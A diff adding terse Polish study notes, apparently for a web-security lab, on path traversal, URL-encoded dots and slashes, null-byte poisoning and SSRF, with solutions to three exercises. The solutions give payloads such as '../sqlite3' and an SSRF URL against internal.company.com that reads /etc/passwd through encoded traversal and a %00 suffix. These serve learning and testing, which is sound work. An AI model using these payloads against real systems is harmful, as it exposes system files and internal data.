@@ -1,0 +1,45 @@
+Path traversals
+dane open./"cos",r wpisać    ../../../../etc/passwd  - filename
+jak zakodować kropke i slasha
+%2f - /
+%2e - .
+%00
+coś dziwnego
+
+Null byte poisoning
+sanityzacja może być przerwana
+secret%00.txt
+%00 null byte
+C przeczzyta do %00
+
+
+SSR podmienić obrazek
+ukraść index html sfr ssr
+
+internal.company.com:8080
+
+# name => ../sqlite3.db
+# url -> http://internal.company.com:8080/index.html%00.txt
+# url -> http://internal.company.com:8080/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.txt
+
+
+#ZAD 1 rozwiązanie XD
+ - username default
+ - password default
+ - obraz https://thumbs.dreamstime.com/b/beautiful-rain-forest-ang-ka-nature-trail-doi-inthanon-national-park-thailand-36703721.jpg
+
+%2f%2e%2e%2fdefault.jpg
+
+https://thumbs.dreamstime.com/b/beautiful-rain-forest-ang-ka-nature-trail-doi-inthanon-national-park-thailand-36703721.jpg
+https://www.shutterstock.com/image-illustration/abstract-wave-technology-background-blue-260nw-2152448863.jpg%00%2f%2e%2e%2fdefault.jpg
+
+albo
+  - nickname ../images/default
+
+#ZAD 2
+  - nickname ../sqlite3
+  - obraz https://imgv3.fotor.com/images/blog-cover-image/part-blurry-image.db
+
+#ZAD 3
+
+  - http://internal.company.com:8080/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.txt
